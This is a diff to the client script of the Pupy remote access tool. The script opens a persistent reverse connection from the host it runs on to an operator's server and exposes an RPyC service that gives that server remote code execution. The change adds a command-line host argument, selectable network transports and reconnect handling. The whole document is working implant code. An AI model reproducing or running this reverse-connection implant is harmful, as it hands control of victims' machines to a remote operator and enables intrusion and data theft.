@@ -6,6 +6,8 @@ import time
 import rpyc
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute, is_py3k
+import rpyc.core.stream
+import rpyc.utils.factory
 import threading
 import weakref
 import traceback
@@ -23,6 +25,11 @@ import re
 import ssl
 import random
 import imp
+import argparse
+from network.conf import transports
+import logging
+#logging.getLogger().setLevel(logging.DEBUG)
+
 
 
 class ReverseSlaveService(Service):
@@ -85,6 +92,14 @@ def add_pseudo_pupy_module(HOST):
 
 def main():
 	HOST="127.0.0.1:443"
+	TRANSPORT="tcp_ssl"
+	if len(sys.argv)>1:
+		parser = argparse.ArgumentParser(prog='pp.py', formatter_class=argparse.RawTextHelpFormatter, description="Starts a reverse connection to a Pupy server\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
+		parser.add_argument('--transport', choices=[x for x in transports.iterkeys()], default=TRANSPORT, help="the transport to use ! (the server needs to be configured with the same transport) ")
+		parser.add_argument('host', metavar='host:port', help='The address of the pupy server to connect to')
+		args=parser.parse_args()
+		HOST=args.host
+		TRANSPORT=args.transport
 	if "windows" in platform.system().lower():
 		try:
 			import pupy
@@ -92,10 +107,9 @@ def main():
 		except ImportError:
 			print "Warning : ImportError: pupy builtin module not found ! please start pupy from either it's exe stub or it's reflective DLL"
 	else:
-		if len(sys.argv)!=2:
-			sys.exit("usage: %s host:port"%sys.argv[0])
-		HOST=sys.argv[1]
 		add_pseudo_pupy_module(HOST)
+	
+
 	attempt=0
 	while True:
 		try:
@@ -106,8 +120,12 @@ def main():
 				rport=int(tab[1])
 			else:
 				rport=443
-			print "connecting to %s:%s"%(rhost,rport)
-			conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)
+			print "connecting to %s:%s using transport %s ..."%(rhost,rport, TRANSPORT)
+			t=transports[TRANSPORT]
+			client=t['client'](**t['client_kwargs'])
+			s=client.connect(rhost, rport)
+			stream = t['stream'](s, t['client_transport'])
+			conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
 			while True:
 				attempt=0
 				conn.serve()
@@ -116,7 +134,11 @@ def main():
 		except SystemExit:
 			print "SystemExit raised"
 			break
+		except EOFError:
+			print "EOF received. exiting."
+			break
 		except Exception as e:
+			print e
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
 
